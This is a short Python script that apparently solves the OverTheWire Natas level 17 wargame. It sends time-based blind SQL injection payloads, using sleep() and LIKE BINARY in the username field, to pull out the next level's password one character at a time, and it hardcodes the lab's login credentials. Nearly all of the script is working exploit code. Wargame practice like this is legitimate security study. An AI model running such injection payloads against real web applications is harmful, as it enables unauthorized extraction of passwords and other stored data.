import requests

url = "http://natas17.natas.labs.overthewire.org"

auth = ("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

chrs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0987654321'

filtered = ''
'''
for c in chrs:
    inject = {'username':'natas18" and password like binary "%{}%" and sleep(5) #'.format(c)}
    
    r = requests.post(url, auth=auth, data=inject)
    if (r.elapsed.seconds) > 1:
        filtered += c
        print(filtered)

'''

filtered = "dghjlmpqsvwxyCDFIKOPR074"
passw = ''

while(True):
    for c in filtered:
        inject = {'username':'natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(1)%23'.format(passw+c)}
        r = requests.post(url, auth=auth, data=inject)
        print(r.elapsed.seconds, passw)
        if (r.elapsed.seconds)>1:
            passw+=c
    #else:
    #    print(passw)
    #     break


